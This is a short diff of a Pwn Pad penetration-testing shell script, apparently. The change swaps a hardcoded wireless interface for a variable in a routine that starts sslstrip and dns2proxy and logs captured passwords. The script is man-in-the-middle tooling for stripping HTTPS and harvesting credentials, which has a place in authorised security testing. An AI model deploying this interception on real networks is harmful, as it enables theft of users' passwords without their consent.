@@ -5,6 +5,7 @@ clear
 #this block controls the features for px_interface_selector
 include_cell=1
 require_ip=1
+default_interface="at0"
 . /opt/pwnix/pwnpad-scripts/px_functions.sh
 
 # Cleanup function to ensure sslstrip stops and iptable rules stop
@@ -40,7 +41,7 @@ f_run(){
   logfile=/opt/pwnix/captures/passwords/sslstrip_$(date +%F-%H%M).log
 
   cd /usr/share/mana-toolkit/sslstrip-hsts
-  python /usr/share/mana-toolkit/sslstrip-hsts/dns2proxy.py at0 &
+  python /usr/share/mana-toolkit/sslstrip-hsts/dns2proxy.py $interface &
   /usr/bin/sslstrip -pfk -w $logfile  -l 8888 $interface 2> /dev/null &
 
   sleep 3
